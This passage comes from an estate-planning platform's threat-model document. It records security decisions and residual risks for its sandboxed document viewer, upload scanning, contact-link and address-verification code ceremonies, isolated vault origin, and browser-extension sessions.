bytes go into a `srcdoc` iframe with `sandbox=""` — the empty value, which
grants nothing: no scripts, no same-origin, no forms, no popups, no top-level
navigation. The component reads nothing and parses nothing, and it adds no
`dangerouslySetInnerHTML`: the M11 source scan covers the new files unchanged
and still allows exactly one use, `app/layout.tsx`'s theme script, which M11
declared as data. (An earlier draft of this paragraph said "anywhere in the
app" and dropped that declared exemption — corrected in the M12 review, since
a doc that overstates a control is the defect class this repo keeps finding.)

Three layers hold it, and only the first two are relied on:

1. **The sandbox.** No script executes, and the frame is in an opaque origin
   with no access to the app's DOM, storage or cookies. `allow-scripts` and
   `allow-same-origin` TOGETHER would undo the whole thing, so the exact value
   is asserted in the component's spec rather than matched as a substring.
2. **The page CSP.** A `srcdoc` frame inherits the embedding document's policy,
   so `img-src 'self' data:` and `connect-src 'self'` apply INSIDE the frame:
   a remote image smuggled into document text is refused by the browser, not by
   anything we wrote. This is the same CSP §6d describes, doing a second job.
3. **The `csp` attribute** (`default-src 'none'`), Chromium-only and stated
   here as defence in depth rather than as the control.

**Verified against a hostile document in a real browser**, not only in jsdom: a
payload carrying a remote `<img>`, an inline `<script>` writing to the parent, an
`onerror` handler, an off-origin `<form>`, a `target="_top"` link and a nested
remote iframe was substituted into the content response and rendered through the
real component. Result: zero network requests to the payload's host, the script
probe never fired, no element from the payload entered the parent DOM, and
`contentDocument` was unreachable from the page.

**A SECOND FENCE ships with it**, because the realistic regression is not an
edit to the viewer: a source scan asserts that `DocumentViewer.tsx` is the ONLY
file in the app that renders an `<iframe>`. A frame added elsewhere for a
preview or an embed would reopen the channel from a file nobody thought of as a
renderer — the credential-graph habit of stating the exception as data.

**What is NOT framed.** Only `text/html` with `encoding: utf8` reaches an
iframe, which is generated content — platform-rendered from a sha256-pinned
template with every substituted value HTML-escaped by the service. An upload can
never be `text/html` (the ingest sniff admits pdf/png/jpeg/tiff only), and the
component checks rather than trusting that invariant from a distance. Presenting
uploaded binaries is PR2's problem and gets its own decision.

**Audited-decrypt volume is a design constraint on this surface, not a
side effect.** Every content read emits `crypto.field.decrypted` +
`document.content.viewed` and consumes a KMS operation, so a list that
previewed content would convert one page load into N events on the user's own
trail and blunt exactly the per-principal decrypt-rate baseline §4 TB4 calls the
single most important insider control. Hence: metadata-only lists, no content
field on the document type, no prefetch, and no cache that would make a repeat
read invisible. Proven live against the stack — two Read presses produced
exactly two decrypt pairs, and loading the list and detail pages produced none.

**Recorded, not fixed.**
- *The 404-vs-403 oracle is narrowed at the edge, not closed.* The BFF answers
  the uniform not-found for a plain downstream 403, so browser traffic cannot
  tell "no such document" from "someone else's". The service still
  distinguishes them for any other caller — the M4 review's open follow-up,
  unchanged, and the real fix belongs there.
- *`documents.title` remains plaintext* (the M4 decision, on the
  `assets_view.title` precedent). The generate form now says so where the field
  is, rather than leaving users to infer that the title is protected like the
  contents.
- *`script-src` is still not locked down*, exactly as §6d states. The sandbox
  does not depend on it: `sandbox=""` blocks script execution inside the frame
  whatever the page policy permits outside it.

**PR2 addendum — ingest, the ladder, and deletion (2026-08-06).**

*The upload gate is the SERVER's, and the client is built not to have an
opinion.* Magic-byte sniffing against the declared mime is the control against
polyglot mislabeling, and the malware scan is fail-closed and pre-storage, so
every refusal means the bytes reached no disk. A client-side type check would
be a second opinion that can disagree with the one that matters — so there is
none: `accept` is a picker hint, `file.type` is forwarded as a declaration, and
the only local check is the size cap, mirroring the server's own number. The
three refusals are kept apart to the last layer (`MALWARE_DETECTED`,
`UNSUPPORTED_CONTENT`, `SCAN_UNAVAILABLE`) because softening a positive scanner
finding into "unsupported file type" would withhold the one thing a user needs
to know about a file somebody sent them. Verified live against real clamd
through the browser: the signature-carrying PNG was refused and nothing stored.

*The execution ladder is computed where the requirements are verified.* Risk #8
is a legal/compliance failure in a state template, treated by "attorney-gated
template releases; per-state execution-requirement engine". A UI that hardcoded
the ladder would be a second copy of that engine, drifting toward the weakest
rung — which is precisely the fail-open the M4 review closed inside the
service. So the service returns `allowedTransitions` from its own
sha256-verified template source, the UI renders exactly that, and the write
path re-resolves the requirements inside its own transaction regardless. An
unverifiable template yields an EMPTY ladder, not a guessed one.

*Presenting an uploaded binary — the decision PR1 deferred.* Images render
INLINE from a `data:` URI: the page CSP already allows `img-src 'self' data:`,
the bytes reach the browser's image decoder (the same exposure any image on any
page carries), and a `data:` URI cannot reach the network. The mime is the
SERVICE's sniffed value, not the uploader's claim, and it is checked against a
closed set before it is interpolated, so no attacker-chosen string becomes the
type of a URI this page constructs. PDFs and TIFFs DOWNLOAD instead: a framed
PDF is the browser's PDF engine — a large parser — invoked on attacker-supplied
bytes inside our own frame tree, whereas a download hands the file to whatever
the user already trusts. The filename is generated from ids, never from
`documents.title`, because a filename is where user text ends up in a shell, a
sync client, or a mail header. Leaving this deferred a second time had a cost
the M12 review named: `Read` was offered for versions the viewer then refused,
so an audited decrypt was spent to display nothing.

*The search term left the URL.* `GET /v1/documents/search?q=` was M4's shape,
and M12 was its first caller. The term is by construction a word out of the
user's own estate — a beneficiary's name, a property address — and a query
string is the one part of a request intermediaries record by default; the
topology docs/01 §2 describes puts CloudFront and WAF access logs in that path.
It is a POST with the term in the body now. Nothing else changed: the term is
still reduced to per-user HMAC tokens and matched ciphertext-side, and no
decrypt happens to serve a search.

*Deletion.* Step-up gated per docs/01 §5, and the legal hold wins over the
owner. Running the real app exposed an ordering seam worth recording: the
step-up guard sits at the controller and the hold check inside the handler, so
a stale session is told `stepup_required` first and the hold only after. That
ordering is fine as defence in depth, but the UI must not send someone to find
an authenticator for an action that will be refused either way — a held
document is now not offered for deletion at all. RECORDED, NOT CHANGED: the
service's ordering, since moving the hold check ahead of the guard would put an
unauthenticated-for-this-action read of estate state before the gate.

## 6f. Threat-model delta — M13 people surface PR1 (2026-08-06)

M13 gives the M2 profile & contacts service its first consumer. PR1 hardens what
was already deployed, before anything is built on top; the surface itself (PR2)
and the contact-link ceremony (PR3) extend this section.

**TB8 (role-holders → owner's estate data) had no step-up gate on its own
control objects.** §5.5's boundary is enforced by `role_assignments` and
`permission_grants` — they are the data that decides what a beneficiary can
read. Creating one is a docs/01 §5 step-up action in terms ("trustee/executor
changes, beneficiary changes"), and M2 shipped all three mutation routes under
`CallerGuard` alone because it predates `@estate/auth-guard`; the sibling
beneficiary route in the asset service complied. So a bearer token stolen from a
live session was sufficient to name a trustee over an entire estate. Closed:
grant, revoke and permission-attach all require a step-up fresh within 5
minutes, uniformly across all twelve roles.

*Why revoke is gated and permission-withdrawal is not.* The M6 rule is that the
protective action must never be HARDER than the permissive one — equal is
allowed. Revoking an assignment is not purely protective in this domain: it
destroys the executor-resolution path M7 depends on and can strip the last
linked contact able to report a death or rescue a §5.1 case, so an attacker who
revokes is isolating the owner, not protecting them. Withdrawing one permission
grant genuinely only narrows, so it is `CallerGuard`-only — an owner who can see
a grant they regret must be able to pull it without first finding their
authenticator.

**A §5.1 control was revocable by accident, twice.** `contacts.linked_user_id`
is the anti-enumeration gate this document credits (§6b: intake "cannot
enumerate" *because* reporters must already be named by the decedent's contact
repository). Two ordinary, unaudited operations silently removed it:

- Editing any field of a contact cleared the column, because one encrypt helper
  hardcoded it null and fed both the insert and the update. Closed by type: the
  shape both statements are built from has no such key.
- Soft-deleting a contact left its `role_assignments` live while every
  role-holder query joins `contacts ... AND deleted_at IS NULL`, so an executor
  stopped resolving and every grant stopped being effective with the assignment
  still listed and no `role.revoked` emitted. Closed with `409 contact_in_use`:
  retiring a fiduciary is a separate, step-up-gated, audited act.

Both are the same class as the M7/M9 findings — a control that stops working
without saying so, indistinguishable from one that is working.

**A Zone B write path destroyed the most sensitive column in the product.**
`PUT /v1/profile` was a full replace while `GET /v1/profile` returns `ssnLast4`
and never `ssn`, so any edit through any client wrote NULL over `ssn_ct` and
`ssn_last4_ct`. Now absent means unchanged. The preservation deliberately copies
CIPHERTEXT: decrypt-and-re-encrypt would put the full SSN through the service on
every unrelated edit and emit a `crypto.field.decrypted` on `profile.ssn` each
time — pure added exposure on the §5.3 bulk-decrypt path in exchange for
nothing. A row whose `dek_id` is no longer the owner's active DEK (crypto-shred)
is refused rather than re-stamped, so an erased record cannot be made to look
intact.

**RECORDED, OWED BY PR2 (§4 TB4).** Contact and family-member reads decrypt
every field, one audited `crypto.field.decrypted` each, so a list view is a
bulk-decrypt surface: twenty contacts is roughly a hundred events on the owner's
own trail per page load, and it blunts the per-principal decrypt-rate baseline
this document calls the single most important insider control. The DEK cache
means it is not a hundred KMS operations, which is the weaker half of the
control. PR1 does not change it; PR2 owes a narrowed list projection under M12's
audited-decrypt-volume rule, and this paragraph is the requirement, not an
observation.

*DISCHARGED FOR CONTACTS, DELIBERATELY NOT FOR FAMILY (PR2).* The contact list
now spends one audited decrypt per row and the values have no field on the wire
at all. The FAMILY list still decrypts every field it stores, and that is a
scope-down with a reason rather than an oversight: the household panel RENDERS
name, date of birth, minority and notes, so there is nothing to narrow — four of
five contact fields were unused by a list, and zero of four family fields are.
The volume differs by an order of magnitude too (a household is a handful of
rows; an address book is not). If a future surface lists family members without
showing them, it inherits this requirement.

## 6g. Threat-model delta — M13 the contact link ceremony (2026-08-06)

`contacts.linked_user_id` had no write path anywhere in the platform until this
change. That is why §6b could credit the linked-contact gate for intake being
unable to enumerate while nobody could actually become a linked contact: the
control was real and the capability behind it was unreachable. M13 PR3 makes it
reachable, which activates every consequence §6b described.

**What a link confers, stated in one place.** Being the linked user of a
contact means: eligibility to open a settlement case against that owner (§5.1
control 1's reporter test), resolvability as their executor when a case is
verified (§5.1 control 5), and effectiveness of any `permission_grant` attached
to a role assignment naming that contact (§5.5). None of those is granted by the
link alone — each needs its own separate step — but none of them is reachable
without it.

**The ceremony.** Owner mints a 160-bit single-use code under step-up; the
server stores only its sha256; the owner is shown it ONCE and delivers it out of
band; the contact redeems it while authenticated on their own existing account.
Three properties are load-bearing:

- *No address is handled anywhere.* M9's shipped doctrine gives the notification
  wire no content field and forbids links, so an emailed invitation would have
  contradicted a decision made one milestone earlier. It also means this flow
  adds no second home for a contact's email address.
- *The code is the ONLY selector on redemption.* The route takes no owner id and
  no contact id — there is no parameter in which to name an account, so
  redemption cannot become an oracle for whether one exists. This is the same
  property §6b credits intake with, preserved rather than re-argued.
- *The redeemer must already have an account.* Not an invite-to-register flow,
  and it cannot be used to create one.

**Uniform refusal.** Unknown, expired, spent, revoked, self-directed and
raced-away codes all answer `invalid_code`, byte-identical. Distinguishing them
would tell whoever holds a guess that the guess named something real. Accepted
cost: a legitimate user gets a vaguer message, paid down by letting the owner
re-issue freely (which retires the previous code and audits the retirement).

**Gate asymmetry, in both directions.** Minting is step-up gated — it hands out a
capability on the §5.1 chain, so it sits with naming a fiduciary. Withdrawing an
unused code and removing a live link are `CallerGuard` only, on the M6 rule that
the protective action must never be harder than the permissive one. Redemption is
`CallerGuard` only because the authority is the code.

**FLAGGED DEVIATION: redemption takes no Cedar decision.** Every other route in
this service passes a PEP first. Redemption cannot: the redeemer has no
relationship to the estate until it succeeds, so every attribute a policy could
match on is precisely what the code stands in for, and a decision there would
read `deny` until the moment it read `allow` for reasons the policy could not
see. The authority is a bearer capability. Recorded here rather than disguised.

**Notifications are a PRECONDITION in production, and the send's OUTCOME is
recorded.** Redemption refuses (503 `notifications_unavailable`, separately
audited) behind an adapter that reaches nobody — the M6/M7/M9 rule. Behind a real
adapter the send is best-effort by design (a notification failure must never roll
back the state change it describes), but never silent: the claim's audit event
carries `ownerNotified: delivered|failed`, the vault delivered_at-NULL precedent,
so a non-delivery is a recorded fact rather than an absence. The notify also runs
BEFORE the audit emit, because the emit propagates broker failures by design and
must not be able to cancel the notification — the code is spent by then and no
retry would ever re-send it. The reason is specific: a claim the owner never
hears about is how a code that went to the wrong person becomes an invisible
authorization edge, and the owner's out-of-band channel is this ceremony's trust
anchor, so their after-the-fact visibility is what makes the anchor auditable.
Profile therefore becomes the third holder of the notifications SEND credential —
and deliberately not of the RECIPIENTS credential, so it can never repoint where
anyone's alerts go (the M9 review's split, applied to a new holder).

**Atomicity is a control, not hygiene.** Spending the invitation and writing the
link happen in one transaction with each statement restating its own
preconditions. A spend with no link would lock that contact out of ever being
linked; a link from an invitation still live would be replayable. Two concurrent
redemptions of one code therefore produce exactly one link and the loser rolls
back — the CAS shape §6b's owner-liveness interlock uses, for the same reason.

**ACCEPTED RESIDUALS, stated rather than implied.**

- *The owner's channel is the trust anchor.* An owner who sends the code to the
  wrong person links the wrong person. Detected rather than prevented: audited on
  both sides with the redeemer as actor, notified to the owner, visible in their
  contact list, and removable in one click. Identical in kind to M6's
  grantee-fingerprint confirmation.
- *The attempt cap bounds an online attack on a REAL code only.* An unknown code
  leaves no row to count against, by construction. 160 bits is what makes
  guessing infeasible; the counter is what an alert would watch. General
  per-caller rate limiting on the redeem route is edge work (§4 TB1).
- *A code lives in the owner's session response and wherever they put it next.*
  It is not stored recoverably server-side, but it is a secret in a browser for
  as long as that page is open, and in whatever channel the owner chooses. That
  is inherent to an out-of-band ceremony.
- *Unlinking does not revoke what the link already enabled.* A settlement case
  the linked contact opened before being unlinked stays open — cases are evidence
  and have no soft delete (§5.1 c6) — and is stopped by the owner's own
  step-up-gated void route, not by unlinking.

## 6h. Threat-model delta — M14 address ownership (2026-08-07)

**What was wrong.** Three shipped fail-closed controls — §5.2 emergency access,
§5.1 settlement intake and review-approve, and §6g's link ceremony — refuse in
production rather than proceed silently, on the rule that a waiting period
nobody can be told about is not a control. All three tested
`deliversToRealChannels`, which is A PROPERTY OF THE ADAPTER, NOT OF THE
RECIPIENT: a hardcoded literal on whichever adapter class that service's own
`NOTIFY_MODE` selected, declared independently three times, `false` on the stub
and `true` on the HTTP one. It asks whether SES is wired. It never asks whether
the stored address belongs to the owner, and could not — the bit never left the
process and never named a recipient. So the gate was satisfied, the escrow
armed or the five-day clock started, and the owner's ability to INTERRUPT — the
entire content of §5.2 and of §5.1's control 3 — was unenforced.

The sharp part was an anti-correlation: the only self-heal was identity's
login-time re-feed, so the stored address was freshest for active users and
STALEST for the dormant owner a fraudulent death report actually targets — and
once status reaches `settlement`, login is blocked, so it could never heal.

**The ceremony.** Identity mints a 160-bit code at FIRST AUTHENTICATED LOGIN
(never at registration — an unauthenticated route would be a mail-bomb and
sender-reputation primitive, and no rate-limiting machinery exists), stores only
its sha256, mails it through notifications' own credential-scoped route, and
marks the address verified when the user returns it. One uniform `invalid_code`
for unknown, expired, spent, revoked, attempt-exhausted, someone-else's and
raced; free re-issue behind a five-minute floor.

**The verified bit lives on `notification_recipients`**, not on `users`, so the
delivery store structurally cannot hold an unproven address without saying so.
`users.email_verified_at` stays dead rather than becoming a second source of
truth.

**Gate classification.** A verified address gates CAPABILITY-ARMING actions, not
case-opening ones:

| requires verified (refuses) | proceeds and records |
|---|---|
| vault escrow `configure` | vault `request`, vault `release` |
| vault `rearm` | profile link redemption |
| profile link-code `invite` | settlement `report`, provider signal, review-approve |

The discriminator is that in the right-hand column the ACTOR and the
NOTIFICATION RECIPIENT are different people. Refusing there on the OWNER's
unverified address would let an owner's own typo permanently deny a legitimate
grantee, redeemer or reporter — the M6 rule that the protective action must
never be harder, pointed the other way — and applied to §5.1 intake it becomes a
denial of service against exactly the dormant, never-verified owner a fraudulent
report targets. Those paths record `sent_unverified` in the send log and an
`unverified_recipient` audit event instead.

**One approved deviation from M9's content doctrine.** The platform now mails a
variable that is not a date. It is a typed `code`, never a `text` field:
platform-authored (`randomBytes`), opaque, single-use, short-lived. The subject
is unchanged and there is still NO LINK, so "we never link you" stays literally
true. It travels on its own route behind its own credential, and `SendSchema` is
built from a kind list that EXCLUDES it, so a send-credential holder — vault,
settlement, profile — cannot fire it.

### Residuals

- *A user who mistypes their address at registration cannot fix it.* There is no
  address-change route anywhere in the platform, and verification can only ever
  target the address already on file. In production such a user is permanently
  refused escrow `configure`, `rearm` and link-code `invite`, with no
  self-service and no operator remedy (that belongs to the TB7 operator
  platform). The arming gates' justification — "refusing costs them an action
  they can unblock themselves" — is true for the intended contrast (actor ==
  recipient) and FALSE as an unconditional claim; it is recorded here rather than
  softened. It fails in the safe direction, and the address-change route that
  closes it already carries a written obligation to clear the verified bit and
  invalidate any outstanding code.
- *A SEND-credential holder can read any user's verified bit* by firing one
  notification at them, because the send response carries `recipientVerified` —
  deliberately, so settlement can record the fact without holding the STATUS
  credential. What the STATUS edge still withholds is the SILENT read: a send
  costs the subject a real estate alarm, a committed send-log row and an audit
  event. A weaker oracle, not none. The M14 security review found the credential
  graph claiming the send edge exposed no delivery state at all; that sentence
  is corrected rather than the field removed.
- *An unreachable status route refuses every arming action.* The gates fail
  closed on an unanswerable query, so a notifications outage suspends escrow
  configuration, re-arming and link-code minting entirely. That is the intended
  direction — blocking delays a legitimate owner by minutes where the other
  direction hands an attacker a whole waiting period — but it is a total outage
  of those paths, not a degradation, and it is the first network round trip
  those gates have ever made.
- *An authenticated attacker can sustain one mail per five minutes to an
  address they typed into their own registration.* The re-issue floor is
  per-account, with no per-address, per-IP or global cap, so a single arbitrary
  address can be sent roughly 288 content-free "confirm this address" messages a
  day. Rate limiting is absent platform-wide; this is the same residual §6c
  records for registration, now with a bound.
- *Registration's fixed-shape, fixed-time response is still owed.* M14 closed
  the address-ownership half of §5.3's enumeration residual and did NOT close
  the timing half: `register` still awaits KMS, inserts and Kafka publishes on
  the new-email path only. Recorded in `auth.service.ts` and unchanged here.
## 6i. Threat-model delta — M15 the vault surface (2026-08-08)

M6 activated **TB6 (client device)** in the library. M15 activates it in the
BROWSER, which is where risk #4 (vault client-side compromise, Critical) has
always actually lived: until now no page in this product ever held a Zone A key,
so every TB6 control in §4 was a requirement with no surface to apply to. §6a
recorded that plainly — "the isolated vault origin, CSP, and Trusted Types are
frontend controls; no vault UI ships in M6, so they land with that surface."
This is that surface. PR1 deliberately ships the boundary with NO vault crypto
behind it yet.

**The §4 TB6 controls, now shipped and their status.**
- *Isolated vault origin:* shipped. A different HOST (`vault.localhost:3010`
  locally, `vault.<domain>` in production), not a different port — MEASURED,
  because cookie scope ignores the port and a port-only split would have sent
  the app's session to the vault on every request. The vault's cookie carries
  the `__Host-` prefix, so host-only is enforced by the browser rather than by
  convention, which is what makes a same-registrable-domain deployment safe.
- *Strict CSP:* shipped, and stricter than the main app's honest-partial one.
  `default-src 'none'`, `script-src 'self'` with NO `unsafe-inline` and NO
  `unsafe-eval` in ANY environment, `connect-src 'self'`, `img-src 'self'` (no
  `data:`), `frame-ancestors 'none'`, `base-uri 'none'`.
- *Trusted Types:* shipped and ENFORCED — `require-trusted-types-for 'script'`
  with `trusted-types 'none'`, so no policy may be created and every DOM XSS
  sink throws. This is only possible because the client is framework-free; a
  framework that templates through `innerHTML` needs a permissive policy, which
  is the control in name only. Verified in a real browser: policy creation
  refused, `innerHTML` threw with zero nodes created, `eval`/`new Function` threw
  EvalError from page context.
- *No third-party scripts on vault surfaces:* shipped, and stronger than an
  allowlist — there is no bundler and no dependency tree. The browser client
  imports only relative paths and (from PR2) `@estate/vault-crypto` by absolute
  path from this origin. Enforced by a source fence.
- *Re-auth on vault open:* shipped. Minting the handoff requires a fresh step-up,
  and the vault service's own SRP legs are step-up gated (M6).
- *WebCrypto non-extractable keys, memory zeroization, clipboard auto-clear:*
  SHIPPED IN PR2. The master key is unwrapped as a non-extractable `CryptoKey`,
  so an injected script on this origin could use it but not read it out. Byte
  arrays are wiped where they exist; the `CryptoKey` itself has no bytes this
  client can zero, and that limit is stated in the code rather than left to be
  read as a stronger promise. Clipboard auto-clear is 20 seconds and is
  described to the user as best effort, because a page cannot read the clipboard
  to check, cannot reach a clipboard manager or a synced clipboard, and never
  clears at all if the tab is closed first.
- *Re-auth on vault open, in full:* the handoff needs a fresh step-up, and the
  vault's own SRP legs are step-up gated. PR2 adds a client-side idle lock at 5
  minutes and a `pagehide` lock, so a bfcache restore returns locked rather than
  with keys in memory.

**New in the threat model: the handoff itself.** Authority now crosses an origin
boundary, which is a channel that did not previously exist. It is a single-use
160-bit code, minted under step-up, delivered by a top-level form POST (never a
URL, a fragment, or a `Referer`), burned on the ATTEMPT, and redeemed
server-side for a session that is `vault`-audience, 15 minutes, and carries NO
refresh token. Deny-by-default audience enforcement means that session opens the
vault service and nothing else — measured across every service. A vault session
cannot mint another handoff, so a leak cannot chain forward.

**Residuals accepted, and why.**
- *The handoff is a bearer capability for 60 seconds.* Anyone holding it can
  redeem it, because the redeem route takes no other selector — which is
  deliberate, since a route that could name an account would be an enumeration
  oracle (§6g's rule). Bounded by the window, single use, TLS in production, and
  by the fact that redemption yields a session that decrypts nothing.
- *The vault origin sees contact NAMES* (from PR3's grantee picker, projected at
  the edge to `{contactId, linkedUserId, name}` and filtered to linked contacts).
  Unavoidable rather than accepted lightly: an owner confirming a key
  fingerprint out of band must know whose key it is. No other Zone B field can
  cross.
- *A subdomain shares a registrable domain with the app.* `__Host-` makes the
  cookie host-only at the browser, so the practical exposure is a cookie set
  with an explicit `Domain=` on the parent — which nothing in this repo does. A
  separate registrable domain closes it entirely and is a deployment choice.
- *`script-src 'self'` trusts this origin's own served files.* A CSP is a
  browser-side control and cannot defend against a compromised BUILD; the
  supply-chain half is the empty dependency tree and the absence of a bundler,
  not this header.
- *No rate limiting on handoff minting.* The same standing follow-up as
  identity's login and the vault's SRP proofs. Interim bound: one unspent
  handoff per user, enforced by a partial unique index, so pressing the button
  repeatedly leaves one live credential rather than many.

**The Secret Key on the device, as a residual rather than a control.** PR2
persists it in IndexedDB by default, with an explicit opt-out. Under XSS on this
origin it is readable — localStorage and IndexedDB alike, since no browser
primitive hides bytes from same-origin script — so the mitigation is the empty
dependency tree, `script-src 'self'` and enforced Trusted Types, not the storage
API. The default is deliberate: requiring 26 retyped characters at every unlock
reliably moves the key to a text file on the desktop, which is worse. The vault
PASSWORD is never persisted, so a stolen Secret Key alone opens nothing.

**PR3 — emergency access reaches a user, and §5.2's ceremony becomes real.**

*The out-of-band fingerprint confirmation is now a shipped control rather than a
design.* Until PR3 the 16-symbol fingerprint the M6 review widened had no client
at all, so key substitution by a malicious server — which `grantee_public_key_
sha256` cannot detect, because that digest is derived from whatever key the
client was handed — was mitigated only on paper. The screen shows the
fingerprint, tells the owner to check it by phone or in person and NOT through
this platform, and refuses to arm until at least one candidate is confirmed.

*A design that could not complete.* M6's `wrapped_private_key` was written and
never served, so a grantee could not open a share sealed to them and no release
could ever finish. Closed by an own-key route gated on an OPEN VAULT, which also
states the property that makes emergency access safe to expose: a stolen bearer
reaches the release route and comes away with ciphertext it cannot open, because
the private half lives inside the grantee's own vault.

*A NEW disclosure, bounded and declared.* Contact names now cross onto the vault
origin. The read is a dedicated profile route whose entire response is a contact
id, an account id and a name, it is the ONLY route in that service a
`vault`-audience session may reach, and both facts are declared as data in
`AUDIENCE_ROUTE_ADMITTERS` and checked against source in both directions. What a
leaked vault handoff buys at profile is therefore exactly that projection for the
owner's own linked contacts — measured against the live service, not argued: the
same token is refused 401 at `/v1/contacts`, `/v1/contacts/:id`, `/v1/profile`,
`/v1/profile/family` and `/v1/role-assignments`. The alternative considered and
REJECTED was a service-wide widening, which would have handed that token the
owner's PII, every contact's decrypted detail, the family tree and the roles.

*Residual, unchanged from M6 and restated because a UI does not fix it:* a server
that releases its platform half early defeats the waiting period. The
compensating controls are the audit trail and owner notification, both of which
this surface now exercises — a request, a refusal and a denial each produce an
ids-and-enums audit event, and the owner's screen offers denial as one ungated
tap.

*Residual, new:* the grantee picker's names come from the candidate list, so a
contact deleted after an arrangement was made shows as an account id. The row
still renders and can still be removed — hiding a live arrangement would be the
worse failure — but the owner sees an opaque id rather than a person.

**PR4 — the security review, and the boundary it found crossed.**

*The isolation held for confidentiality and not for destruction.* Reaching the
vault API was never opening a vault — that needs the vault password and the
Secret Key, neither of which this platform holds. But `POST /v1/vault/reset` is
gated on step-up ALONE, deliberately, because a lost vault password cannot be
proven; and handoff redemption granted step-up. So a stolen 60-second code
crypto-shredded every item, the emergency escrow and the recovery keypair. The
escalation is the sharp part: app-origin script cannot MINT a handoff (minting is
step-up gated) but can read one out of the hidden field it is posted in, so
stealing a code converted no-step-up into step-up authority over Zone A — and
the app origin is the weaker one, since its `script-src` is not locked down
(M11). CLOSED: redemption grants no step-up, and the vault origin proves its own
factor through `POST /v1/auth/stepup`, the route widened in PR1 for exactly this.

*The fingerprint ceremony had one side.* The owner reads a code out; the grantee
had nowhere to read theirs, so the only defence against a malicious server
substituting its own key for a grantee's could not be exercised.
`grantee_public_key_sha256` cannot substitute for it — it is derived client-side
from whatever key the client was handed. CLOSED: the grantee's own fingerprint is
displayed, computed from the key the server serves back.

*Residual, unchanged and now stated on the screen rather than implied:* a
released escrow reconstructs the owner's recovery key and this client cannot yet
read their items with it. Release is one-shot, so pressing the button spends the
arrangement. The warning is given BEFORE the action; the reader is a separate
change with its own retention decision, because holding a second owner's master
key in memory is not something to settle inside a fix round.

*Residual, accepted:* an M-of-N escrow above threshold 1 is refused by this
client at both layers. The protocol and the service support it; collecting
several grantees' shares does not exist, and arming an arrangement nobody can
open would be worse than declining to arm it.

## 6j. Threat-model delta — M16 the vault browser extension (2026-08-10)

M16 opens **TB9** (§3, §4): the extension against arbitrary web pages. This
section is written as PR1 begins and is updated by each PR as its controls land,
rather than assembled after the review — the M14 rule that a milestone which
invalidates a sentence owns that sentence.

**Why this is not TB6 with a new client.** TB6's controls are the isolated
origin, its CSP, enforced Trusted Types and an empty dependency tree. None of
them reaches a page we do not serve. An extension is code of ours running beside
code of theirs, on their origin, with read and write access to their DOM — a
channel with no counterpart anywhere else in the platform.

**Decisions and their residuals.** The full list is in docs/04 M16 and the
CLAUDE.md decision log; the security-relevant shape is:

- *Keys* live as non-extractable `CryptoKey`s in an offscreen document, the only
  extension context that loads `@estate/vault-crypto`. Persisting a `CryptoKey`
  in extension IndexedDB — possible, and the option the brief's premise hid — is
  REFUSED, because it yields a vault permanently open with no password, no
  Secret Key and no TOTP, defeating 2SKD and §5 of docs/01. *Residual:* while
  unlocked, code in that context decrypts everything; non-extractability stops
  exfiltration, not use.
- *The extension is server-anchored.* It caches item ciphertext and nothing that
  enables an offline unlock, so the offline brute-force target M15 kept off the
  disk stays off it. *Residual:* no unlock without connectivity.
- *Origin matching* is the boundary's defining control; see §4 TB9.
- *The credential* is a refresh-capable `extension`-audience session, admitted
  PER HANDLER to FIVE vault routes (`keysetStatus`, both SRP legs, `listItems`,
  `lock`) and THREE identity ones (`session`, `stepUp`, `logout`). What a stolen
  copy buys, end to end: the ability to attempt an SRP handshake, which
  additionally requires a fresh step-up, the vault password and the Secret Key —
  and no item, because every read is behind `VaultSessionGuard`. EIGHTEEN vault
  routes refuse it, including `reset`, both keyset routes, `deleteItem` and
  every emergency-access route; so does `mintHandoff`, so a leaked extension
  session cannot chain itself into a vault one.
  `POST /v1/auth/refresh` is deliberately absent from that count and is not an
  omission: it carries no guard at all, being unauthenticated by construction,
  so there is no audience decision to declare there. What keeps it safe is a
  different property — refresh ROTATES IN PLACE, updating the same session row,
  so a refreshed session cannot change what it is for. That was true by accident
  of an UPDATE's SET list until M16 pinned it with a test.

**What M16 closes that predates it.**

- *§6a's rate-limiting residual, in part.* Step-up now carries an attempt cap
  derived from the append-only `auth_events` ledger, which bounds the vault's SRP
  legs TRANSITIVELY because both are step-up gated. The half that remains open is
  a caller with a genuine step-up burning handshakes.
- *No user-reachable session revocation.* Before M16, `revokeAllForUser` had one
  caller behind a service credential, and identity exposed no session listing, no
  revoke-by-id and no password-change or password-reset route — so the only way
  to revoke a session was to present it. Tolerable while every session was one
  cookie-bound browser; not tolerable beside a long-lived credential on a device.
  PR1 ships the first paired-devices list with per-row revoke, ON A SURFACE and
  in the same PR as the routes: an owner can see every live credential on their
  account and end any of them. Revocation is deliberately UNGATED — the M6 rule
  that the protective action must never be harder than the permissive one, with
  minting the pairing code as the gated half — while the row for the caller's
  OWN session goes through logout instead, because only logout also expires the
  cookies carrying it, and a browser that still looks signed in over a dead
  session is the M8 logout entry's worst outcome. What a row can SAY is bounded
  by what identity returns: an audience and two timestamps, no IP and no device
  name, since those columns exist and nothing writes them. So a row identifies a
  credential by what it can REACH rather than by where it is — which is also the
  one place a user reads the boundary this milestone exists to create.
- *A fence that was documented and never written.* `004_session_audience_and_
  handoffs.sql` claimed a spec pinned its `CHECK` to `SESSION_AUDIENCES`; none
  existed. PR1 writes it, mutation-tested.

**Residuals carried, not closed.**

- *A compromised store update is undetectable by the platform.* Reproducible
  builds and published provenance make it discoverable by a third party.
- *Autofill does not resist phishing.*
- *App-origin script can read a pairing code out of the DOM*, buying a paired
  extension that reaches ciphertext only and appears in the owner's device list.
  PR1's surface displays the code in a `<code>` text node, deliberately behind a
  step-up and shown once, which is the shape M13's link code already takes; what
  it does not do — and cannot, on an origin whose `script-src` M11 recorded as
  not locked down — is keep script on that origin from reading it. The device
  list is what makes the result VISIBLE rather than silent.
- *An older audit consumer drops an action it does not know.* A rolling deploy
  where identity is ahead of the audit service loses those events: an
  unrecognised action is a `schema_violation` to the consumer, indistinguishable
  from malformed input. Observed as absence during PR1's live drive (the mint
  and pairing events emitted before the audit service was rebuilt never reached
  `audit_events`); the rejection itself was read from `ingestor.ts` rather than
  seen, because the container's logs did not survive its restart. Deploy order —
  contracts consumers first — is the mitigation, and it is not enforced anywhere.
- *Rotation-reuse detection can self-revoke* an extension whose service worker
  died mid-rotation. The behaviour is correct; the cost is a re-pair.
- *REVOKING A PAIRED DEVICE IS NOT INSTANT DOWNSTREAM.* Identity revokes the row
  synchronously and answers 401 immediately, but every other service resolves a
  caller through `HttpSessionVerifier`, whose positive cache is keyed by
  sha256(token) with `DEFAULT_CACHE_TTL_MS` of 30 seconds (2026-07-23). So a
